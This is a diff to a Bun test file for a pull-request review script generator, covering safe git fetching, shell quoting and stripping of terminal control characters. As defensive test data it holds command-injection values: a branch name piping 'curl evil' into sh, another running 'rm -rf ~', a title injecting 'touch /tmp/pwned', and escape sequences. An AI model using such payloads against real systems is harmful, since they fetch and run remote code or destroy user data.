@@ -1,5 +1,5 @@
 import { describe, expect, test } from "bun:test";
-import { buildReviewTerminalScript, shellQuote, terminalScriptFileName } from "../src/terminal-launch";
+import { buildReviewTerminalScript, shellQuote, terminalScriptFileName, terminalText } from "../src/terminal-launch";
 import type { WatchItem } from "../src/types";
 
 function prItem(overrides: Partial<WatchItem> = {}): WatchItem {
@@ -28,21 +28,22 @@ function prItem(overrides: Partial<WatchItem> = {}): WatchItem {
 }
 
 describe("buildReviewTerminalScript", () => {
-  test("checks out a safe branch and guards a dirty working tree", () => {
+  test("fetches the PR into refs/attn/ without checking it out", () => {
     const script = buildReviewTerminalScript(prItem());
     expect(script).toContain("cd '/Users/dev/work/api'");
-    expect(script).toContain("git status --porcelain");
-    expect(script).toContain("git checkout feature/retry");
-    expect(script).toContain("set -e");
+    expect(script).toContain(
+      'git fetch origin "+refs/pull/42/head:refs/attn/pr-42" "+refs/heads/main:refs/attn/base-42"',
+    );
+    expect(script).toContain("git diff refs/attn/base-42...refs/attn/pr-42");
+    expect(script).not.toMatch(/git (checkout|switch|worktree|pull|stash)/);
     expect(script).toContain("exec zsh");
   });
 
-  test("never inlines unsafe author-controlled refs; falls back to the PR number", () => {
+  test("never inlines unsafe author-controlled refs", () => {
     const script = buildReviewTerminalScript(prItem({ headBranch: "x$(curl evil|sh)", baseBranch: "y; rm -rf ~" }));
     expect(script).not.toContain("curl evil");
     expect(script).not.toContain("rm -rf ~");
-    expect(script).toContain("git fetch origin pull/42/head:pr-42");
-    expect(script).toContain("git checkout main");
+    expect(script).toContain('"+refs/heads/main:refs/attn/base-42"');
   });
 
   test("shell-quotes free text like titles so quotes cannot escape", () => {
@@ -50,6 +51,19 @@ describe("buildReviewTerminalScript", () => {
     expect(script).not.toContain("; touch /tmp/pwned; '\n");
     // The single-quote escaping keeps the payload inside the quoted echo arg.
     expect(script).toContain(shellQuote("acme/api #42: don't'; touch /tmp/pwned; '"));
+  });
+
+  // zsh's echo expands backslash escapes even inside single quotes, so a title
+  // could clear the window and print fake output. CI's Linux runner lacks zsh;
+  // the macOS release job runs this.
+  test.skipIf(!Bun.which("zsh"))("prints a hostile title literally, with no escape sequences", () => {
+    const title = "x \\e[2J\\cREST \u001b]0;pwned\u0007";
+    const script = buildReviewTerminalScript(prItem({ title }));
+    const header = script.split("\n").slice(2, 4).join("\n");
+    const result = Bun.spawnSync(["zsh", "-f", "-c", header]);
+    expect(result.stdout.toString()).toBe(
+      "acme/api #42: x \\e[2J\\cREST ]0;pwned\nhttps://ghe.example.com/acme/api/pull/42\n",
+    );
   });
 
   test("refuses non-PR items and items without a local checkout", () => {
@@ -70,5 +84,12 @@ describe("terminalScriptFileName", () => {
   test("builds a filesystem-safe .command name", () => {
     expect(terminalScriptFileName(prItem())).toBe("review-api-42.command");
     expect(terminalScriptFileName(prItem({ repoName: "weird repo/name" }))).toBe("review-weird-repo-name-42.command");
+  });
+});
+
+describe("terminalText", () => {
+  test("removes C0, DEL, and C1 control characters and keeps other text", () => {
+    expect(terminalText("a\u001b[2Jb\u0007c\u007fd\u009be\nf\tg")).toBe("a[2Jbcdefg");
+    expect(terminalText("naïve 修正 \\e")).toBe("naïve 修正 \\e");
   });
 });
